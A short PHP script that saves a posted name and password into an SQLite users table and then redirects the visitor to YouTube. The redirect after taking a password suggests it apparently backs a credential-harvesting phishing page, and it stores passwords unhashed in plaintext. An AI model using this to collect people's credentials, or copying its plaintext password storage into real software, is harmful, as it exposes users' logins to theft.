<?php
$db = new SQLite3(__DIR__ . '/data/user.db');


$columns = [];
$schemaResult = $db->query("PRAGMA table_info(users)");

if ($schemaResult) {
    while ($column = $schemaResult->fetchArray(SQLITE3_ASSOC)) {
        $columns[] = $column['name'];
    }
}

if (in_array('a', $columns, true) && !in_array('password', $columns, true)) {
    $db->exec("ALTER TABLE users RENAME COLUMN a TO password");
}


$db->exec("
    CREATE TABLE IF NOT EXISTS users (
        name TEXT NOT NULL,
        password TEXT NOT NULL
    )
");

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $name = $_POST["name"];
    $password = $_POST["password"];

    
    $stmt = $db->prepare("INSERT INTO users (name, password) VALUES (:name, :password)");
    $stmt->bindValue(':name', $name, SQLITE3_TEXT);
    $stmt->bindValue(':password', $password, SQLITE3_TEXT);
    $stmt->execute();

    header("Location: https://www.youtube.com");
    exit();
}
?>
